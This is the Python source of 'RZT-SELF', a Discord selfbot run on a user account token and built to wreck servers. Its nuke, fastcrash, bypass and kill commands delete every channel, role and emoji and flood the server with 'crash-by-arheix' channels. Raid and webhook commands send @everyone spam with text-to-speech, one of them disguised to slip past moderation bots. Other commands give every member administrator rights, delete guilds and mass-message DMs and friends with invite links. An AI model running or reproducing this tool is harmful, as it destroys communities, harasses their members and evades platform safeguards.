# RZT-SELF

licnese = """
Copyright (c) 2022 Arheix 

 Permission is hereby granted, free of charge, to any person obtaining a copy 
 of this software and associated documentation files (the "Software"), to deal 
 in the Software without restriction, including without limitation the rights 
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
 copies of the Software, and to permit persons to whom the Software is 
 furnished to do so, subject to the following conditions: 

 The above copyright notice and this permission notice shall be included in all 
 copies or substantial portions of the Software. 

 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE 
 SOFTWARE.
 """

import os
try:
    import discord
except:
    os.system('pip install discord.py==1.7.3')

from discord.ext import commands

try:
    import colorama
except:
    os.system('pip install colorama')

from colorama import Fore, init

try:
    import asyncio
except:
    os.system('pip install asyncio==3.4.3')
try:
    import random
except:
    os.system('pip install random')
try:
    import fade
except:
    os.system('pip install fade==0.0.9')
try:
    import aiohttp
except:
    os.system('pip install aiohttp')

from discord import Permissions

from discord.utils import get

from time import sleep

import string

from discord import Permissions

import inspect

import urllib

import datetime
try:
    import requests as rq
except:
    os.system('pip install requests')


class Selfbot():
    __version__ = "1.3.1"
    __developers__ = ["Arheix", "devyatka"]

with open('token.txt', 'r') as file:
    token = file.read()
    
prefix = '.'

application_id = 1081585367129538560
large_image_id = 1081589522065788979
small_image_id = 1081588975661232279

intents = discord.Intents.all()
client = commands.Bot(command_prefix = prefix, self_bot = True, intents=intents)
client.remove_command('help')
splink = 'https://t.me/numoun'

def time4logs():
    return f'{datetime.datetime.now().strftime("%H:%M:%S")}'

async def rezet(ctx):
    for _ in range(50):
        channel = await ctx.guild.create_text_channel(f"crash-by-arheix-{random.randint(1, 1000)}")

with open('arheix.jpg', 'rb') as foto:
    avatar = foto.read()

prevv = f"""
  ██████╗ ███████╗████████╗ ███████╗███████╗██╗     ███████╗      ╔═════════════════════INFO═════════════════════╗
  ██╔══██╗╚══███╔╝╚══██╔══╝ ██╔════╝██╔════╝██║     ██╔════╝         @ Login Completed!                         
  ██████╔╝  ███╔╝    ██║    ███████╗█████╗  ██║     █████╗           {Fore.RED}@ Warning: Use at own your risk.{Fore.RESET}
  ██╔══██╗ ███╔╝     ██║    ╚════██║██╔══╝  ██║     ██╔══╝           @ Author: https://t.me/numoun
  ██║  ██║███████╗   ██║    ███████║███████╗███████╗██║              @ Powered by Python            
  ╚═╝  ╚═╝╚══════╝   ╚═╝    ╚══════╝╚══════╝╚══════╝╚═╝           ╚══════════════════════════════════════════════╝"""

def startprint():
    os.system('cls')
    faded_text = fade.purplepink(prevv)
    print(faded_text)
    print(f"   RZTSELF is protected by {Fore.BLUE}MIT LICENSE{Fore.RESET}. RZTSELF is a powerful selfbot tool for discord. RZTSELF using power of {Fore.BLUE}Python{Fore.RESET}")
    print(f'{Fore.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}')
    print()
    print(f"                          please, install {Fore.BLUE}all needed files{Fore.RESET} and provide token in {Fore.BLUE}token.txt{Fore.RESET} file!")
    print()
    print(f'{Fore.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}')
    print()
    print(f'{Fore.MAGENTA}{time4logs()} | INFO | Logged as {client.user}{Fore.RESET}')
    print(f'{Fore.YELLOW}{time4logs()} | INFO | Selfbot running with version {Selfbot.__version__}{Fore.RESET}')

@client.event
async def on_ready():
    await client.change_presence(
        status=discord.Status.online, 
        activity=discord.Activity(
            type=discord.ActivityType.streaming,
            application_id = application_id,
            details = "Arheix Self",
            state='https://t.me/numoun',
            name = "RZTSELF",
        assets = {
            'large_image' : str(large_image_id),
            'large_text':'https://discord.gg/numoun',
            'small_image': str(small_image_id)
        },
        url = 'https://twitch.tv/404',
        timestamps = {
            'start': 1645701071
        },
        )
    )
    startprint()

def purplepink(text):
    system(""); faded = ""
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

@client.command()
async def help(ctx):
    await ctx.send(f"""```diff
            RZT-SELF help command



[обязательный аргумент] <не обязательный аргумент>

{prefix}nuke — стандарт краш
{prefix}fastcrash — быстрый краш
{prefix}bypass - краш с обходом протект ботов
{prefix}killch — удаляет все каналы 
{prefix}killrl — удаляет все роли которые возможно удалить 
{prefix}ping — шлет в консоль пинг селфбота (задержку)
{prefix}status - команды статуса 
{prefix}srvname [название] — меняет название серверу
{prefix}spam [количество] [текст] — спамит в канал где была написана команда
{prefix}spamch [количество] [название] — спамит определенное количество каналов с вашим названием
{prefix}spamvch [название] — спамит голосовыми каналами с вашим названием
{prefix}spamrl [количество] [название] — спамит ролями с вашим названием
{prefix}chname [название] — переименовывает текущий канал в ваше название
{prefix}renamech [название] - переименовывает все каналы в ваше название
{prefix}renamerl [название] — переименовывает все роли в ваше название
{prefix}raid <текст> — спамит вашим текстом во все каналы 
{prefix}raid2 [текст] — спамит во все каналы с обходом автомодерки джунипера и других ботов
{prefix}hookspam <текст> — мощный вебхук спамер
{prefix}spamwebhere <текст> - спам хуком в один канал
{prefix}createhook <название> - создает вебхук в канале
{prefix}deletehooks - удаляет все вебхуки в канале
{prefix}randomch - спам рандом количества каналов с рандомным названием
{prefix}randomrl - спам рандом количества ролей с рандомным названием
{prefix}adminall - выдать всем админку
{prefix}rename - меняет иконку и название сервера
{prefix}createguild - создает новый сервер
{prefix}deleteguild - удаляет сервер(если вы овнер)
{prefix}leave - ливает с сервера
```""")


async def kill_ch(ctx,ch):
    try:
        await ch.delete()
    except:
        pass

async def kill_rl(ctx,role):
    try:
        await role.delete()
    except: 
        pass

async def rename_ch(ctx,ch):
    try:
        await ch.edit(name=f'Crash by Arheix {random.randint(1, 1000)}')
    except:
        pass

async def rename_rl(ctx, rl):
    try:
        await rl.edit(name=f'Crash by Arheix {random.randint(1, 1000)}')
    except:
        pass

async def createch(ctx):
    try:
        c = await ctx.guild.create_text_channel(f'crash-by-arheix' + '-' + ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=8)))
    except: 
        pass
    else:
        pass

async def createrl(ctx):
    try:
        r = await ctx.guild.create_role(f'Crash by Numoun {random.randint(1, 1000)}')
    except:
        pass




@client.command()
async def fastcrash(ctx):
    for rolee in ctx.guild.roles:
        asyncio.create_task(kill_rl(ctx,role=rolee))
    for channel in ctx.guild.channels:
        asyncio.create_task(kill_ch(ctx,ch=channel))
    for _ in range(50):
        asyncio.create_task(createch(ctx))
        asyncio.create_task(createrl(ctx))
    try: 
        await ctx.guild.edit(name=f'Crash by Numoun', icon=avatar)
        print(f'{Fore.GREEN}{time4logs()} | LOG | Successfully Crashed!{Fore.RESET}')
    except:
        print(f'{Fore.RED}{time4logs()} | LOG | Cannot crash the server{Fore.RESET}')


@client.command()
async def nuke(ctx):
    for a in ctx.guild.roles:
        try: await a.delete()
        except: pass
    for b in ctx.guild.emojis:
        try: await b.delete()
        except: pass
    for c in ctx.guild.channels:
        try: await c.delete()
        except: pass
    try: await ctx.guild.edit(name="Crash by Arheix", icon=avatar)
    except: pass
    for _ in range(50):
        try: await ctx.guild.create_text_channel(name="crash-by-arheix")
        except: pass
    for _ in range(50):
        try: await ctx.guild.create_role(name="Crash by ExNutella")
        except: pass

@client.command()
async def ping(ctx):
    ping = round(client.latency * 1000)
    print(f'{Fore.WHITE}{time4logs()} | LOG | selfbot ping is {ping}ms{Fore.RESET}')

@client.command()
async def killch(ctx):
    for channel in ctx.guild.channels:
        asyncio.create_task(kill_ch(ctx, ch=channel))
        print(f'{Fore.GREEN}[{time4logs()} | LOG | channel {channel.name} was deleted!{Fore.RESET}')

@client.command()
async def killrl(ctx):
    for role in ctx.guild.roles:
        asyncio.create_task(kill_rl(ctx))

@client.command()
async def status(ctx, argument=None, *, names='RZTSELF'):
    bll = [''] 
    if argument == 'stream':
        await client.change_presence(activity=discord.Streaming(name=names, description = "https://t.me/numoun", state="pon", url='https://twitch.tv/unknownpage'))
        await ctx.message.add_reaction('✅')
    elif argument == 'watch':
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=names, description="rztself", state="https://t.me/numoun"))
        await ctx.message.add_reaction('✅')
    elif argument == 'listen':
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=names, description="rztselfbot", state="https://t.me/numoun"))
        await ctx.message.add_reaction('✅')
    elif argument == 'play':
        await client.change_presence(activity=discord.Game(name=names, description="rezetselfbot", state="https://t.me/numoun"))
        await ctx.message.add_reaction('✅')
    elif argument == 'afk':
        await client.change_presence(status = discord.Status.invisible, afk = True)
        await ctx.message.add_reaction('✅')
    elif argument == 'clear':
        await client.change_presence(activity = None)
        await ctx.message.add_reaction('✅')
    elif argument == 'default_stream':
        await client.change_presence(
            status=discord.Status.online, 
            activity=discord.Activity(
                type=discord.ActivityType.streaming,
                application_id = application_id,
                details = "Arheix Self",
                state='https://t.me/numoun',
                name = "RZTSELF",
            assets = {
                'large_image_url' : str(large_image_id),
                'large_text':'https://discord.gg/numoun',
                'small_image_url': str(small_image_id)
            },
            url = 'https://twitch.tv/404',
            timestamps = {
                'start': 1645701071
            },
            )
        )
        await ctx.message.add_reaction('✅')
    elif argument == 'listen_spotify':
        await client.change_presence(
            status=discord.Status.online, 
            activity=discord.Activity(
                type=discord.ActivityType.listening,
                application_id = application_id,
                details = "Arheix Self",
                state='https://discord.gg/SzEaB8HRFc',
                name = "Spotify",
                album_cover_url='https://open.spotify.com/track/61BaxM1NIcadLu3gtWm2uT?si=dOe8iNSzR2K5xNeNqDGJZg&utm_source=copy-link',
            assets = {
                'large_image' : str(large_image_id),
                'large_text':'https://t.me/numoun',
                'small_image': str(small_image_id)
            },
            timestamps = {
                'start': 1645701071,
                'end' : 1666666666
            },
            )
        )
        await ctx.message.add_reaction('✅')
    elif argument == None:
        await ctx.send(f"""```
{prefix}status stream - статус стримит[name]
{prefix}status watch - статус смотрит[name]
{prefix}status listen - статусс слушает[name]
{prefix}status play - статус играет[name]
{prefix}status listen_spotify - особенный статус *слушает*
{prefix}status default_stream - дефолтный статус  *стримит* который при запуске
{prefix}status afk - афк статус
{prefix}status clear - очистить статус```""")


@client.command()
async def srvname(ctx, *, name='RZTSELF'):
    guild = ctx.guild
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
    print(f'{Fore.GREEN}{time4logs()} | LOG | Server Name changed to {guild.name}!{Fore.RESET}')

@client.command()
async def rename(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="Crash by Arheix", icon=avatar)

@client.command()
async def spam(ctx, kv, *, text=f'@everyone {splink}'):
    while int(kv) !=0:
        await ctx.send(text)
        kv = int(kv)-1
        try: 
            print(f'{Fore.GREEN}{time4logs()} | LOG | Message sent to Channel!{Fore.RESET}')
        except: 
            print(f'{Fore.RED}{time4logs()} | LOG | Cannot send message to the channel!{Fore.RESET}')

@client.command()
async def spamch(ctx, kv='50', *, name='rztself'):
    while int(kv) !=0:
        await ctx.guild.create_text_channel(name)
        kv = int(kv)-1
        try: 
            print(f'{Fore.GREEN}{time4logs()} | LOG | Channel {name} successfully created!{Fore.RESET}')
        except:
            print(f'{Fore.RED}{time4logs()} | LOG | Cannot complete the task: Something went wrong{Fore.RESET}')


@client.command()
async def ben(ctx, *, text):
  ballik = random.randint(1, 4)
  if ballik == 1:
    await ctx.send('Yes')
  if ballik == 2:
    await ctx.send('ugh...')
  if ballik == 3:
    await ctx.send('ho-ho-ho')
  if ballik == 4:
    await ctx.send('No.')

@client.command()
async def stopspam(ctx):
    global spam
    spam = False
    await ctx.message.add_reaction('✅')

@client.command()
async def spamvch(ctx, kv='25', *, name='RZTSELF'):
    while int(kv) !=0:
        await ctx.guild.create_voice_channel(name)
        kv = int(kv)-1
        try: 
            print(f'{Fore.GREEN}{time4logs()} | LOG | Channel {name} successfully created!{Fore.RESET}')
        except:
            print(f'{Fore.RED}{time4logs()} | LOG | Cannot complete the task: Something went wrong{Fore.RESET}')

@client.command()
async def spamrl(ctx, kv='50', *, name='RZTSELF'):
    while int(kv) !=0:
        await ctx.guild.create_role(name)
        kv = int(kv)-1
        try: 
            print(f'{Fore.GREEN}{time4logs()} | LOG | Role {name} successfully created!{Fore.RESET}')
        except:
            print(f'{Fore.RED}{time4logs()} | LOG | Cannot complete the task: Something went wrong{Fore.RESET}')

@client.command()
async def spamr(ctx, kv='50', *, nm='RZTSELF'):
    await ctx.message.delete()
    while int(kv) !=0:
        im1=random.randint(0, 255)
        im2=random.randint(0, 255)
        im3=random.randint(0, 255)
        await ctx.guild.create_role(name=nm, colour=discord.Colour.from_rgb(im1, im2, im3))
        kv = int(kv)-1
        try: 
            print(f'{Fore.GREEN}{time4logs()} | LOG | Role {nm} successfully created!{Fore.RESET}')
        except Exception as exc:
            print(f'{Fore.RED}{time4logs()} | LOG | {exc}{Fore.RESET}')

@client.command()
async def renamech(ctx, *, name='rztself'):
    for ch in ctx.guild.channels:
        try:
            await ch.edit(name=name)
            print(Fore.GREEN + f"{time4logs()} | LOG | Channel {ch} renamed to {name}{Fore.RESET}")
        except:
            pass

@client.command()
async def renamerl(ctx, *, name=''):
    for rl in ctx.guild.roles:
        try:
            await rl.edit(name=name)
            print(Fore.GREEN + f"{time4logs()} | LOG | Role {rl} renamed to {name}{Fore.RESET}")
        except:
            pass

@client.command()
async def chname(ctx, *, name='cr4sh3dddd'):
    channel = ctx.channel
    await ctx.channel.edit(name=name)
    print(f'{Fore.GREEN}{time4logs()} | LOG | Channel Name Successfully edited to {channel.name}')
    await ctx.message.add_reaction('✅')

async def rraidd(ctx,customtext):
    for channel in ctx.guild.text_channels:
        for _ in range(200):
            try:
                await channel.send(customtext, tts=True)
                print(f'{Fore.GREEN}{time4logs()} | LOG | message sent to the channel {channel.name}!{Fore.RESET}')
            except:
                pass

@client.command()
async def raid(ctx, *, customtext=f'@everyone Raid by Numoun {splink}'):
    pass

async def r2(ctx, msg):
    channels = await ctx.guild.fetch_channels()
    for _ in range(500):
        for channel in channels:
            if channel.type == discord.ChannelType.text:
                try:
                    antimod = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))
                    await channel.send(f'||{antimod}|| {msg}', tts=True)
                    print(f'{Fore.GREEN}{time4logs()} | LOG | message sent to the channel {channel.name}!{Fore.RESET}')
                except:
                    continue

@client.command()
async def raid2(ctx, *, msg='DDoS by Numoun https://discord.gg/F9uNynGkDM @everyone'):
    await ctx.message.delete()
    asyncio.create_task(r2(ctx, msg))

async def create_webhook(channel, message):
    try:
        webhook = await channel.create_webhook(name='DDoS')
    except:
        pass
    asyncio.create_task(spam(webhook, message))
async def spam(webhook, message):
    for i in range(200):
        try:
            await webhook.send(message, tts=True, username='Дмитрий Губанов', avatar_url='https://cdn.discordapp.com/attachments/1034447386409447495/1038778039808573440/rezet.jpg')
        except:
            pass
 
@client.command(aliases=['spamhook', 'webhookall', 'hookall', 'spamweb', 'webspam'])
async def hookspam(ctx, *, message=f'||@everyone / @here|| You have been crashed by Arheix \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n {splink} {random.randint(1, 1500)}'):
            await ctx.message.delete()
            for channel in ctx.guild.text_channels:
                for webhook in await channel.webhooks():
                        asyncio.create_task(spam(webhook, message))
            for channel in ctx.guild.text_channels:
                asyncio.create_task(create_webhook(channel, message))

@client.command()
async def spamwebhere(ctx, *, message='tets'):
            await ctx.message.delete()
            channel = ctx.channel
            for hooks in await channel.webhooks():
                if hooks == 0:
                    asyncio.create_task(create_webhook(channel, message))
            for webhook in await channel.webhooks():
                asyncio.create_task(spam(webhook, message))

@client.command()
async def createhook(ctx, *, name='RZTSELF Webhook'):
    channel = ctx.channel
    webhook = await channel.create_webhook(name=name, avatar = avatar)
    webhook_url = webhook.url
    print(Fore.GREEN + f'{time4logs()} | LOG | Webhook Successfully created! url: {webhook_url}')

@client.command()
async def deletehooks(ctx):
    channel = ctx.channel
    hooks = await channel.webhooks()
    for hook in hooks:
        try:await hook.delete(reason='RZTSELF')
        except:pass

@client.event
async def on_guild_channel_create(channel):
    if 'crash-by-numoun' in channel.name or 'crash-by-arheix' in channel.name:
        webhook = await channel.create_webhook(name = "Crash by Arheix", avatar = avatar)
        webhook_url = webhook.url
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
            while True:
                try:
                    await webhook.send(f"@everyone @here You have been crash3d by Great Numoun {splink}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n ||{random.randint(1, 1000)}||")
                except:
                    pass

@client.command()
async def bypass(ctx, message=f'@everyone crashed by Numoun {splink}'):
    print(Fore.MAGENTA + f'{time4logs()} | LOG | Starting...{Fore.RESET}')
    for channel in ctx.guild.channels:
        asyncio.create_task(rename_ch(ctx,ch=channel))
    for role in ctx.guild.roles:
        asyncio.create_task(rename_rl(ctx,rl=role))
    for channel in ctx.guild.text_channels:
        hhhh = await channel.create_webhook(name="Crash by Arheix")
        for i in range(10):
            for channel in ctx.guild.text_channels:
                hooks = await channel.webhooks()
                for hook in hooks:
                    await hook.send(f'@everyone @here Crash by Arheix \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{splink} ||{random.randint(1, 1500)}||')
    await ctx.guild.edit(icon=avatar)

async def rrandchh(ctx):
    count = random.randint(1, 400)
    for i in range(count):
        try: 
            await ctx.guild.create_text_channel(name=''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=30)))
        except: 
            pass

@client.command()
async def randomch(ctx):
    asyncio.create_task(rrandchh(ctx))


async def rrandmrll(ctx):
    count = random.randint(1, 225)
    for i in range(count):
        try:
            await ctx.guild.create_role(name=''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=25)))
        except:
            pass

@client.command()
async def randomrl(ctx):
    asyncio.create_task(rrandmrll(ctx))

@client.command()
async def adminall(ctx):
    guild = ctx.guild
    role = discord.utils.get(guild.roles, name = '@everyone')
    try: 
        await role.edit(permissions = discord.Permissions(administrator = True))
    except:
        pass

@client.command(aliases=['clearconsole', 'clearmenu'])
async def cls(ctx):
    os.system('cls')
    startprint()


@client.command()
async def seelicense(ctx):
    print(licnese)

@client.command()
async def spaminv(ctx, count=30):
    for i in range(count):
        try:
            invitelinkk = await ctx.guild.text_channels[0].create_invite(max_uses=2, unique=True)
        except Exception as e:
            print(f'{Fore.RED}{time4logs()} | LOG | {e}{Fore.RESET}')




@client.command()
async def ancr(ctx):
    for ch in ctx.guild.channels:
        asyncio.create_task(kill_ch(ctx,ch))
    for rl in ctx.guild.roles:
        asyncio.create_task(kill_rl(ctx,role=rl))
    asyncio.create_task(rezet(ctx))

@client.command()
async def createguild(ctx, *, name="RZTSELF"):
    try:
        guildd = await client.create_guild(name=name)
    except:
        pass
    listt = await guildd.fetch_channels()
    for channel in listt:
        await channel.delete()
    await guildd.create_text_channel(name="chat")

@client.command()
async def deleteguild(ctx):
    try:
        await ctx.guild.delete()
    except:
        print(f"{Fore.RED}[{time4logs()} | ERROR | You are not owner of this guild")


@client.command()
async def leave(ctx):
    await ctx.send("GG тима раков я ливаю")
    await ctx.guild.leave()

#@client.command()
#async def crash(ctx):

@client.command()
async def kill(ctx):
    for chh in ctx.guild.channels:
        asyncio.create_task(kill_ch(ctx,ch=chh))
    for rolee in ctx.guild.roles:
        asyncio.create_task(kill_rl(ctx, role=rolee))

@client.command()
async def dm(ctx, *, text):
    for user in client.private_channels:
        try: await user.send(text)
        except: pass

@client.command()
async def ff(ctx):
    for user in client.user.friends:
        try: await user.send('https://discord.gg/SzEaB8HRFc зайди')
        except: pass

@client.command()
async def quarantine(ctx):
    role = discord.utils.get(role, name='@everyone')
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(role, view_channel=False)
        except:
            pass

try:
    client.run(token, bot = False)
except Exception as exc:
    print(f'{Fore.RED}ERROR | {exc}{Fore.RESET}')